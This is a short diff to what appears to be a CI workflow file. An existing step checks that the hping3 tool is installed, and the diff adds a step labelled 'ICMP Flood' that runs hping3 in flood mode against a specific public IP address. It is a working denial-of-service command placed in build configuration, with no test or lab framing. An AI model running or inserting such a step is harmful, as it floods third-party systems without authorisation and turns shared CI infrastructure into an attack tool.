@@ -30,3 +30,8 @@ jobs:
     - name: Test h3ping
       run: |
         sudo hping3 --help
+        
+    - name: ICMP Flood
+      run: hping3 --icmp -d 56 --flood 47.106.20.243
+        
+        
